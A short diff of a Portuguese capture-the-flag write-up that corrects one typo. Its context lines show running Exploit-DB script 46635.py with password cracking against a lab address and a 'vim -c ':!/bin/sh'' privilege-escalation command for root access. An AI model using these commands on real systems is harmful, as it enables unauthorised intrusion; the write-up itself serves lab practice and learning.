@@ -19,7 +19,7 @@ Ao rodar o script em python na aplicacao web era possivel encontrar o user mitch
     $ python2 46635.py -u http://10.10.250.145/simple/ --crack -w /usr/share/wordlists/rockyou.txt
 
 
-Em seguida usamos o reverseshell conseguiamos ter acesso root e ler a pasta root e concluindo o desafio.
+Em seguida usamos o reverseshell conseguimos ter acesso root e ler a pasta root e concluindo o desafio.
 
     vim -c ':!/bin/sh'
 
